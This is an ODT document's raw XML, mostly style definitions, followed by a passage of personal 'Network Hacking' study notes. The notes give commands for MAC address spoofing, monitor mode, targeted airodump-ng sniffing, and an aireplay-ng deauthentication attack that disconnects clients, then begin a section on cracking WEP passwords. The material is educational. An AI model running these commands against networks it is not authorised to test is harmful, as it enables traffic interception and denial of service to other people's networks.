      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00a0c1b9" officeooo:paragraph-rsid="009f9b61" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P98" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00a38f7e" officeooo:paragraph-rsid="00a2b77a" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P99" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00a50390" officeooo:paragraph-rsid="00a50390" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P100" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="Numbering_20_123">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="15pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="000da561" officeooo:paragraph-rsid="000f8305" style:font-size-asian="15pt" style:font-weight-asian="bold" style:font-size-complex="15pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P101" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="Numbering_20_123">
      <style:text-properties fo:font-size="15pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="000da561" officeooo:paragraph-rsid="000da561" style:font-size-asian="15pt" style:font-weight-asian="bold" style:font-size-complex="15pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P102" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="List_20_1">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="14pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00641a49" officeooo:paragraph-rsid="00641a49" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P103" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00b03fe3" officeooo:paragraph-rsid="000d4d65"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c5aef9" officeooo:paragraph-rsid="00c5aef9"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c85f26" officeooo:paragraph-rsid="00c70047" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P106" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="000d4d65" officeooo:paragraph-rsid="000d4d65" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P107" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00d60bf7" officeooo:paragraph-rsid="00ce6b73" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P108" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00d78e6c" officeooo:paragraph-rsid="00ce6b73" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P109" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00baf4ce" officeooo:paragraph-rsid="00baf4ce" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P110" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00e8f329" officeooo:paragraph-rsid="00e8f329" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P111" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00ebe37f" officeooo:paragraph-rsid="00ebe37f"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8305" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00140e74" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001581b6" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00158629" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00afebba" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00b03fe3" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c738eb" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00c85f26"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8e9ee" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00d78e6c" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00e20dba" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00e23d14" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00e7f628" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties officeooo:rsid="00178e74"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties officeooo:rsid="001921e4"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties officeooo:rsid="0019bc5b"/>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cd8b1" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001eb3bf" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="002057e1" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00212d0f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0022af59" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0023fc25" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0025172e" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0028f27a" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00296c4c" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="002d1556" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="002fcc39" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00315ec1" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="003d9142" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="004198bf" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00477334" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="005099d6" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00555f12" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="005c181d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="005d3578" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0068e9ee" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="006aa27f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T42" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00717c81" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T43" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00874f8d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T44" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0095a87b" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T45" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00973e4e" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T46" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="009dedaf" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T47" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="009e80d5" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T48" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00a8d176" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T49" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00a944f5" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T50" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00ab674d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00afebba" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T52" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="001eb3bf"/>
    </style:style>
    <style:style style:name="T53" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="002057e1"/>
    </style:style>
    <style:style style:name="T54" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00212d0f"/>
    </style:style>
    <style:style style:name="T55" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0022af59"/>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344acb" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T58" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="003579eb" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T59" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="004c2d63" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T60" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="004d85b3" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T61" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0068e9ee" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T62" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="006aa27f" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T63" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0073d0a7" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T64" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00812f01" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T65" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0082a7d6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T66" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0089e932" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T67" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00a0c1b9" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T68" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00d2392d" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T69" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00d60bf7" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T70" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00d78e6c" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T71" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0042c6e5"/>
    </style:style>
    <style:style style:name="T72" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00468efa"/>
    </style:style>
    <style:style style:name="T73" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="004c2d63"/>
    </style:style>
    <style:style style:name="T74" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="004c80bf"/>
    </style:style>
    <style:style style:name="T75" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="004d85b3"/>
    </style:style>
    <style:style style:name="T76" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="005099d6"/>
    </style:style>
    <style:style style:name="T77" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00555f12"/>
    </style:style>
    <style:style style:name="T78" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="005743b0"/>
    </style:style>
    <style:style style:name="T79" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="005c181d"/>
    </style:style>
    <style:style style:name="T80" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="005d3578"/>
    </style:style>
    <style:style style:name="T81" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00539622"/>
    </style:style>
    <style:style style:name="T82" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0066e77a"/>
    </style:style>
    <style:style style:name="T83" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0067951b"/>
    </style:style>
    <style:style style:name="T84" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0068d64b"/>
    </style:style>
    <style:style style:name="T85" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0073d0a7"/>
    </style:style>
    <style:style style:name="T86" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00769765"/>
    </style:style>
    <style:style style:name="T87" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0077a998"/>
    </style:style>
    <style:style style:name="T88" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0087aa38"/>
    </style:style>
    <style:style style:name="T89" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="0098ca71"/>
    </style:style>
    <style:style style:name="T90" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="009e80d5"/>
    </style:style>
    <style:style style:name="T91" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00a0c1b9"/>
    </style:style>
    <style:style style:name="T92" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00a38f7e"/>
    </style:style>
    <style:style style:name="T93" style:family="text">
      <style:text-properties style:text-underline-style="none" officeooo:rsid="00af0478"/>
    </style:style>
    <style:style style:name="T94" style:family="text">
      <style:text-properties officeooo:rsid="002d1556"/>
    </style:style>
    <style:style style:name="T95" style:family="text">
      <style:text-properties officeooo:rsid="003a288c"/>
    </style:style>
    <style:style style:name="T96" style:family="text">
      <style:text-properties officeooo:rsid="004d85b3"/>
    </style:style>
    <style:style style:name="T97" style:family="text">
      <style:text-properties officeooo:rsid="00555f12"/>
    </style:style>
    <style:style style:name="T98" style:family="text">
      <style:text-properties fo:font-size="14pt" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T99" style:family="text">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T100" style:family="text">
      <style:text-properties officeooo:rsid="0064b336"/>
    </style:style>
    <style:style style:name="T101" style:family="text">
      <style:text-properties fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="T102" style:family="text">
      <style:text-properties fo:font-size="13pt" fo:font-weight="bold" officeooo:rsid="0068e9ee" style:font-size-asian="13pt" style:font-weight-asian="bold" style:font-size-complex="13pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T103" style:family="text">
      <style:text-properties fo:font-size="13pt" fo:font-weight="bold" officeooo:rsid="006de558" style:font-size-asian="13pt" style:font-weight-asian="bold" style:font-size-complex="13pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T104" style:family="text">
      <style:text-properties fo:font-size="13pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0068e9ee" style:font-size-asian="13pt" style:font-weight-asian="normal" style:font-size-complex="13pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T105" style:family="text">
      <style:text-properties officeooo:rsid="00a70228"/>
    </style:style>
    <style:style style:name="T106" style:family="text">
      <style:text-properties officeooo:rsid="00a7e9ff"/>
    </style:style>
    <style:style style:name="T107" style:family="text">
      <style:text-properties officeooo:rsid="00bcf033"/>
    </style:style>
    <style:style style:name="T108" style:family="text">
      <style:text-properties officeooo:rsid="00c03168"/>
    </style:style>
    <style:style style:name="T109" style:family="text">
      <style:text-properties officeooo:rsid="00c85f26"/>
    </style:style>
    <style:style style:name="T110"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11" style:family="text">
      <style:text-properties fo:font-size="15pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="00b03fe3" style:font-size-asian="15pt" style:font-weight-asian="normal" style:font-size-complex="15pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T112" style:family="text">
      <style:text-properties fo:font-size="15pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" style:font-size-asian="15pt" style:font-size-complex="15pt"/>
    </style:style>
    <style:style style:name="T113" style:family="text">
      <style:text-properties officeooo:rsid="00e23d14"/>
    </style:style>
    <style:style style:name="T114" style:family="text">
      <style:text-properties officeooo:rsid="00e73a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ical Hacking</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">Network Hacking</text:p>
      <text:p text:style-name="P2"/>
      <text:list xml:id="list3402554999" text:style-name="Numbering_20_123">
        <text:list-header>
          <text:p text:style-name="P85"/>
        </text:list-header>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P41">Network Basics: <text:span text:style-name="T1"><text:s/>Contains no. of clients connected to Resources. Wired or Wireless connection.</text:span></text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P41">Router/Access point: <text:span text:style-name="T1">It has the access to the resource. Client will have access to the resource through this access poin</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1">. In your case the access point will be router(In your home network).</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P38">Client will sent request to the resource through the access point. Data transfer b/w client and access point as <text:span text:style-name="T10">Packets. </text:span><text:span text:style-name="T2">Packets are send through the air. You can catch this packet if you are in the area of the network.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list170336368088892" text:continue-numbering="true" text:style-name="Numbering_20_123">
        <text:list-item>
          <text:p text:style-name="P100">Pre-connection attack</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P39">Wireless adapter requirements: -Monitor mode -Packet Injection -Ap mode</text:p>
      <text:p text:style-name="P42">MAC Address:<text:span text:style-name="T1"> Media access controle. Permanent, Physical, unique address. Assigned by manufacture. Used to identify devices and transfer data between the devices.</text:span></text:p>
      <text:p text:style-name="P43"><text:span text:style-name="T1">Packet contains source and destination mac address. MAC address increase anonymity. <text:s/></text:span><text:span text:style-name="T4">Changing MAC address hide your identity. </text:span><text:span text:style-name="T5">Ether represents the <text:s/>mac address. When interfaces are not connected to a network there will not be any IP address.</text:span></text:p>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P44">Changing MAC address: 1. Disable interface → ifconfig wlan0 down. <text:s/><text:span text:style-name="T16">2. </text:span><text:span text:style-name="T17">Change Mac Address <text:s/>→ ifconfig wlan0 hw ether 00:11:22:33:44:55 <text:s text:c="2"/></text:span><text:span text:style-name="T18">3. Enable interface → </text:span>ifconfig wlan0 <text:span text:style-name="T18">up</text:span></text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P45">Mac address will be changed back once you restart the computer. Because here we are only changing in the memory.</text:p>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P42">IP Adress: <text:span text:style-name="T1">Used to Identify the computers. </text:span></text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P40">Change mode of the wlan0: <text:span text:style-name="T10">Managed and Monitor → We need monitor mode to access all the packets. In managed mode we can only access the packets which only has source and destination mac address, But in case of onitor mode you can access <text:s/>all the packets in the range.</text:span></text:p>
      <text:p text:style-name="P48"/>
      <text:p text:style-name="P47">Changing <text:s/>manage mode to monitor mode: </text:p>
      <text:p text:style-name="P47"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P47">iwconfig</text:p>
      <text:p text:style-name="P47">ifconfig wlan0 down</text:p>
      <text:p text:style-name="P47">airmon-ng check kill</text:p>
      <text:p text:style-name="P41">iwconfig wlan0 mode monitor</text:p>
      <text:p text:style-name="P41">ifconfig wlan0 up</text:p>
      <text:p text:style-name="P46">iwconfig</text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P8">Packet Sniffing:<text:span text:style-name="T19"> </text:span><text:span text:style-name="T21">Using Airodump-NG <text:s/>---→ airodump-ng wlan0 </text:span><text:span text:style-name="T22">(wlan0 is the interface in monitor mode)</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T20">in the result → </text:span><text:span text:style-name="T52">E</text:span><text:span text:style-name="T19">SSID</text:span><text:span text:style-name="T20">: Mac address of the target address <text:s/></text:span><text:span text:style-name="T19">PWR</text:span><text:span text:style-name="T20">: Power of the network(Signal strength) <text:s/></text:span><text:span text:style-name="T19">Beacons</text:span><text:span text:style-name="T20">: Frames <text:s/></text:span><text:span text:style-name="T19">#Data:</text:span><text:span text:style-name="T20"> No. of useful packets. </text:span><text:span text:style-name="T19">Ch:</text:span><text:span text:style-name="T20"> Channel </text:span><text:span text:style-name="T19">MB</text:span><text:span text:style-name="T20">: Maximum speed supported </text:span><text:span text:style-name="T19">ENC</text:span><text:span text:style-name="T20">: Encryption used by the network </text:span><text:span text:style-name="T53">CIPHER</text:span><text:span text:style-name="T23">: c</text:span><text:span text:style-name="T27">i</text:span><text:span text:style-name="T23">pher used </text:span><text:span text:style-name="T54">AUTH</text:span><text:span text:style-name="T24">: Authentication used <text:s/></text:span><text:span text:style-name="T55">ESSID</text:span><text:span text:style-name="T25">: Name of the ne</text:span><text:span text:style-name="T26">t</text:span><text:span text:style-name="T25">work.</text:span></text:p>
      <text:p text:style-name="P62"/>
      <text:p text:style-name="P10">Wifi Bands:<text:span text:style-name="T20"> Band define what frequency a network can use. <text:s/></text:span><text:span text:style-name="T21">Airodump-NG </text:span><text:span text:style-name="T28">sniff only 2.4 ghz frequency network. airodump-ng <text:s/>--band a <text:s/>wlan0 <text:s/></text:span><text:span text:style-name="T29">will get all the packets from all bands of networks. </text:span></text:p>
      <text:p text:style-name="P63"/>
      <text:p text:style-name="P11"><text:soft-page-break/>Targeted packet sniffing:<text:span text:style-name="T20"> <text:s text:c="2"/>airodump-ng <text:s/>--bssid AC:84:C6:27:81:B4 --channel 4 --write test <text:s/>wlan0 </text:span></text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P65">bssid: mac address of <text:s/>access point channel: channel which receiving data write: writing the details to a packet. <text:s/>Wlano: Interface in monitor mode</text:p>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P12"><text:span text:style-name="T94">Wireshark</text:span><text:span text:style-name="T30">: It is used to analyse data.</text:span><text:span text:style-name="T20"> </text:span></text:p>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P13">DeAuthentication Attack<text:span text:style-name="T20">: </text:span><text:span text:style-name="T31">Disconnect any client from any network. </text:span><text:span text:style-name="T32">We pretend like client, </text:span></text:p>
      <text:p text:style-name="P66"/>
      <text:p text:style-name="P4"><text:span text:style-name="T32">aireplay-ng --deauth 1000000000 -a AC:84:C6:27:81:B4 <text:s/>-c 54:35:30:A7:C2:B5 wlan0 --→ </text:span><text:span text:style-name="T57">deauth: Fake authentication <text:s text:c="2"/>-a: access point mac address <text:s/>-c: client mac adress (Mac address of the device that you want to disconnect) </text:span><text:span text:style-name="T58">wlan0: interface which is in monitor mode.</text:span></text:p>
      <text:list xml:id="list170335436569637" text:continue-numbering="true" text:style-name="Numbering_20_123">
        <text:list-header>
          <text:p text:style-name="P85"/>
        </text:list-header>
        <text:list-item>
          <text:p text:style-name="P101">Gaining access</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P72"/>
      <text:p text:style-name="P38">-<text:span text:style-name="T95">How to break wifi password: <text:s/></text:span></text:p>
      <text:p text:style-name="P38"/>
      <text:list xml:id="list3340991673" text:style-name="List_20_1">
        <text:list-item>
          <text:p text:style-name="P86"><text:span text:style-name="T98">Wired Equivalent Privacy: </text:span><text:span text:style-name="T99"><text:s/></text:span><text:span text:style-name="T20"><text:s/>old encryption. Very simple to break, Still used in some networks. </text:span></text:p>
        </text:list-item>
      </text:list>
